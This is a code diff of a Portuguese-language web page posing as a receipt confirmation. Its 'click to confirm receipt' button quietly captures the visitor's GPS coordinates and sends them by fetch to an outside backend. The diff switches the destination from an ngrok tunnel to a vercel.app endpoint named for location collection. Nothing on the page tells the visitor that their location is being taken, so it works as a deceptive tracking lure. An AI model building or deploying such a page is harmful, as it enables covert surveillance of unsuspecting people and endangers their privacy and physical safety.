@@ -20,7 +20,8 @@
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
-    <button class="botao" onclick="navigator.geolocation.getCurrentPosition(sendLocation, handleError)">Clique aqui para confirmar o recebimento</button>
+    <button class="botao" onclick="navigator.geolocation.getCurrentPosition(sendLocation, handleError)">Clique aqui para
+      confirmar o recebimento</button>
 
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
@@ -57,13 +58,15 @@
       // console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("https://1f4a-2804-7f0-bb41-46f3-ed00-231b-6a2b-9a9e.ngrok-free.app/receber-localizacao", {
+      fetch("https://localizacao-backend.vercel.app/receber-localizacao", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: JSON.stringify({ latitude, longitude })
       })
+
+
         .then(response => response.json())
         .then(data => {
           if (data.success) {
